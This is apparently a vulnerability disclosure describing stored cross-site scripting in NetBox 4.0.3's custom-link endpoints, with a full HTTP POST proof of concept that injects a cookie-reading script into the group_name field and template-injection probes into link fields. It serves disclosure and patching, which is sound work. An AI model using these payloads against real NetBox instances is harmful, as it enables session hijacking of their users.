# **Description:**

Store XSS on the api /extras/custom-links/add/ or /extras/custom-links/{id}/edit of NetBox version 4.0.3 (https://github.com/netbox-community/netbox) allow remote attackers hijack user's cookies attack via param  Group name.

# **Proof of Concept:**

1, Add or Edit a Custom Link  with malicious script tags at param  Group Name

2, Access Object Type using Custom Link

3, Immediately boom, Stored XSS is executed

POST /extras/custom-links/add/ HTTP/1.1
Host: localhost:8000
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://localhost:8000/extras/custom-links/add/
Content-Type: multipart/form-data; boundary=---------------------------300193789523924448502163188369
Content-Length: 1589
Origin: http://localhost:8000
Connection: close
Cookie: csrftoken=GPFwHFgQsCVRlXGYb2Efv9gKs2SXEiIN; sessionid=jv3bmrc6goo62qohlkckic0eolv7nrde
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
X-PwnFox-Color: red
Priority: u=1

-----------------------------300193789523924448502163188369
Content-Disposition: form-data; name="csrfmiddlewaretoken"

oDVU0Umj4Oip7YXSKVBW5T4WgmBHvaJZUiqgxpsZmg36iLtGLN51qSawyejuZihC
-----------------------------300193789523924448502163188369
Content-Disposition: form-data; name="name"

<h1>test</h1>
-----------------------------300193789523924448502163188369
Content-Disposition: form-data; name="object_types"

46
-----------------------------300193789523924448502163188369
Content-Disposition: form-data; name="weight"

100
-----------------------------300193789523924448502163188369
Content-Disposition: form-data; name="group_name"

<body onload=prompt(document.cookie)>
-----------------------------300193789523924448502163188369
Content-Disposition: form-data; name="button_class"

outline-dark
-----------------------------300193789523924448502163188369
Content-Disposition: form-data; name="enabled"


-----------------------------300193789523924448502163188369
Content-Disposition: form-data; name="enabled"

on
-----------------------------300193789523924448502163188369
Content-Disposition: form-data; name="new_window"


-----------------------------300193789523924448502163188369
Content-Disposition: form-data; name="link_text"

{{7*7}}
-----------------------------300193789523924448502163188369
Content-Disposition: form-data; name="link_url"

{{7*7}}
-----------------------------300193789523924448502163188369
Content-Disposition: form-data; name="_create"


-----------------------------300193789523924448502163188369--

![image](https://github.com/minhquan202/Vuln-Netbox-XSS/assets/89106168/bf617022-880a-4c2a-a798-002a25da662b)
![image](https://github.com/minhquan202/Vuln-Netbox-XSS/assets/89106168/6ce2c08d-9ead-480f-8d4f-1f3e2954abbb)

# Impact:

hijack user's cookies
